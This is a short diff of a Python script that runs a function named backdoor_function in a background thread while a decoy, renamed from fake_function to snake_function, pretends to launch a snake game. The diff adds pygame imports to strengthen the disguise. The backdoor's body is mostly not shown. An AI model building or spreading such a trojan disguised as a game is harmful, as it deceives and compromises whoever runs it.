@@ -1,6 +1,9 @@
 import socket
 import os
 import time
+import pygame
+import sys
+import random
 from threading import Thread
 
 def backdoor_function():
@@ -59,9 +62,9 @@ def backdoor_function():
         else:
             print("Leave")
 
-def fake_function():
+def snake_function():
     print("I WILL RUN THE SNAKE PROGRAM!")
 
 if __name__ == "__main__":
     Thread(target = backdoor_function).start()
-    Thread(target = fake_function).start()
+    Thread(target = snake_function).start()
